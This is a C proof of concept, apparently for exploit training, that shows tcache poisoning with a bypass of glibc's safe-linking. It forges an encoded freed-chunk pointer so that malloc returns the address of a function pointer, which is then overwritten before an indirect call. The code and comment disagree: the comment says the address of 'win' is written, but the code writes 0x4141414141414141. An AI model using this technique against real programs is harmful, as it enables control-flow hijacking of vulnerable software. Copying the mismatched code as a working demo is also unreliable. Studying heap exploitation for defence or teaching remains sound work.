
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>

struct Target {
    char padding[0x20];
    void (*callback)(void);
};

static struct Target target
    __attribute__((aligned(16)));

static void safe(void)
{
    puts("safe callback");
}

static void win(void)
{
    puts("WIN");
}

int main(void)
{
    char *b = malloc(0x30);
    char *a = malloc(0x30);

    if (a == NULL || b == NULL) {
        return 1;
    }

    target.callback = safe;

    printf("a                  = %p\n", (void *)a);
    printf("b                  = %p\n", (void *)b);
    printf("&target            = %p\n", (void *)&target);
    printf("&target.callback   = %p\n",
           (void *)&target.callback);
    printf("safe               = %p\n", (void *)safe);
    printf("win                = %p\n", (void *)win);

    puts("\n[before overwrite]");
    target.callback();

    free(b);
    free(a);

    uintptr_t goal =
        (uintptr_t)&target.callback;

    uintptr_t encoded_goal =
        goal ^ ((uintptr_t)a >> 12);

    /*
     * a->next를 &target.callback으로 조작
     */
    *(uintptr_t *)a = encoded_goal;

    /*
     * fake entry goal의 next를 NULL로 구성
     */
    *(uintptr_t *)goal = goal >> 12;

    char *p = malloc(0x30);
    char *q = malloc(0x30);

    printf("\n[allocation]\n");
    printf("p                  = %p\n", (void *)p);
    printf("q                  = %p\n", (void *)q);
    printf("expected q         = %p\n", (void *)goal);

    if (p != a) {
        puts("[-] first allocation failed");
        return 1;
    }

    if (q != (char *)goal) {
        puts("[-] controlled allocation failed");
        return 1;
    }

    /*
     * q는 &target.callback을 가리킨다.
     * 따라서 q에 win 주소를 쓰면 callback이 win으로 바뀐다.
     */
    *(uintptr_t *)q = 0x4141414141414141;

    printf("\n[after overwrite]\n");
    printf("target.callback    = %p\n",
           (void *)target.callback);

    puts("\n[indirect call]");
    target.callback();

    return 0;
}
